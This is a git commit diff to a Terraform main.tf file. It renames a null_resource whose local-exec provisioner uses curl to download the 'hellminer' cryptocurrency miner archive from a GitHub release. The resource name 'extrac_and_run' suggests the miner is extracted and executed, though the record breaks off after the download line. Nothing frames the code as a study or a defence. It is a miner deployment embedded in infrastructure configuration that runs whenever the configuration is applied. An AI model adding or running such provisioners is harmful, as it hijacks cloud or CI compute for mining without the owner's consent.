9dd651c39b975614d5e60cf8c9fefeb19bd7b88b
mooghen01-hue <chriskm0101@outlook.com>
2026-01-09 20:14:47 +0700

    Update main.tf

--- main.tf
+++ main.tf
@@ -1,4 +1,4 @@
-resource "null_resource" "extrac_and_run_3" {
+resource "null_resource" "extrac_and_run_1" {
   provisioner "local-exec" {
     command = <<EOT
 curl -L https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64.tar.gz > hellminer_linux64.tar.gz
